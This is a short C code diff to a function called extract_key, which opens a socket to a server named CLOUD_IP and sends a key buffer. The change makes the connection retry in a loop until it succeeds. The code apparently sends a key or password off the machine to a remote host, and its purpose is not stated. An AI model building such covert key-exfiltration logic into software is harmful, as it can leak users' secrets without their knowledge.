@@ -32,7 +32,8 @@ int extract_key(char *key)
     };
     inet_pton(AF_INET, CLOUD_IP, &server.sin_addr);
 
-	connect(sock, (struct sockaddr*)&server, sizeof(server));
+	while (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
+		sleep(1);
     if (send(sock, key, PASS_SIZE, 0) < 0)
     {
         printf("extract_key: failed to send key\n");
